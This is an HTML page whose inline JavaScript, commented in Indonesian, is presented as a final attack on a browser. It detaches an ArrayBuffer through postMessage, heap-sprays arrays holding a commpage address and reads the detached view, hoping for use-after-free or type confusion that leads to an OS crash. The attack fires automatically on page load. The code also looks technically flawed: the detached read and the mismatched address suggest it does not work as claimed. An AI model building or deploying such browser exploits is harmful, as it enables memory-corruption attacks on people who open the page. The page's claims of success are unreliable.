<!DOCTYPE html>
<html>
<head>
    <title>PostMessage ArrayBuffer Detach (Type Confusion)</title>
</head>
<body>

    <h1>PostMessage Detach Type Confusion (Final Attack)</h1>
    <p>Target Commpage Address (32-bit): 0x0FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan PostMessage Detach Race...</p>
    <div id="log-area"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
        const TARGET_LENGTH_VALUE = Number(COMM_PAGE_ASB_TARGET_OFFSET); // Gunakan Offset 0x320 sebagai nilai 32-bit
        
        const LOW_WORD = Number(COMM_PAGE64_BASE_ADDRESS & 0xFFFFFFFFn) + TARGET_LENGTH_VALUE; // Commpage Address Low Word
        const HIGH_WORD = Number(COMM_PAGE64_BASE_ADDRESS >> 32n);

        let startTime = performance.now();
        let payloadHolders = []; 
        let victimArray = null;

        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        // --- FUNGSI HEAP SPRAY PAYLOAD (Targeting 32-bit fields) ---
        function sprayPayload() {
            log("Memulai Spraying Payload (32-bit)...", "log-spray");
            const SPRAY_COUNT = 3000;
            const PAYLOAD_SIZE = 100; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Uint32Array(PAYLOAD_SIZE);
                // Tempatkan LOW_WORD (Commpage Address) di tengah array
                payloadArray[5] = LOW_WORD; 
                payloadArray[6] = 0x41414141; 
                payloadHolders.push(payloadArray); 
            }
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runDetachAttack() {
            startTime = performance.now();
            log("Phase 1: Membuat Array Korban dan Array Buffer.", "log-init");

            const BUFFER_SIZE = 1024 * 1024; // 1MB Buffer
            let victimBuffer = new ArrayBuffer(BUFFER_SIZE);
            // Victim Array (View) tetap berada di thread utama
            victimArray = new Uint32Array(victimBuffer);
            victimArray.fill(0xBABEBABE);
            
            // 1. FREE (Detach): Kirim ArrayBuffer ke dirinya sendiri (Window) sebagai Transferable
            // Ini akan membuat victimBuffer menjadi 'detached' dan ArrayBuffer View C++ di belakang victimArray menjadi tidak valid.
            window.postMessage({ cmd: 'detach', buffer: victimBuffer }, '*', [victimBuffer]);
            log(`Phase 2: victimBuffer DITRANSFER (Detached). Length: ${victimBuffer.byteLength}`, "log-critical");

            // 2. SPRAY SINKRON
            // Kernel memori yang menyimpan buffer yang sudah detached/free harus segera ditimpa.
            sprayPayload(); 
            log("Phase 3: SPRAY Commpage Payload SINKRON.", "log-critical");
            
            // 3. TRIGGER: Akses Victim Array yang seharusnya sudah tidak memiliki Buffer.
            // Jika ArrayBuffer View C++ (yang ada di belakang victimArray) tidak diperbarui dengan benar, 
            // array ini akan membaca dari memori yang baru di-spray.
            
            setTimeout(() => {
                log("Phase 4: Memicu Access OOB pada Array yang Detached.", "log-critical");

                try {
                    // Coba baca di index 5, yang seharusnya diisi oleh LOW_WORD di sprayPayload
                    const OOB_INDEX = 5; 
                    const crashValue = victimArray[OOB_INDEX]; 
                    
                    log(`Nilai dibaca: 0x${crashValue.toString(16)}`, "log-critical");

                    // SUCCESS JIKA: crashValue == Commpage LOW_WORD
                    if (crashValue === LOW_WORD) {
                        log("SUCCESS: Detach/Type Confusion Berhasil! Commpage Address Ditemukan!", "log-success");
                    }

                    // Trigger Final (Jika OOB Read berhasil): Paksa JIT crash dengan nilai yang dibaca
                    let finalArray = new Array(crashValue & 0xFFFF);
                    finalArray.fill(0);

                } catch(e) {
                     log(`JS Exception saat Trigger: ${e.message} - Menunggu Crash OS.`, "log-critical");
                }

            }, 50);
        }
        
        // Listener untuk menangkap hasil PostMessage (tidak melakukan apa-apa selain membersihkan)
        window.onmessage = function(e) {
            if (e.data && e.data.cmd === 'detach') {
                log("PostMessage diterima. Transfer Buffer Selesai.", "log-info");
            }
        };

        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian PostMessage Detach Attack...';
            setTimeout(runDetachAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Type Confusion.';
        });
    </script>
    <style>
        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }
        .log-success { color: green; font-weight: bold; }
    </style>
</body>
</html>
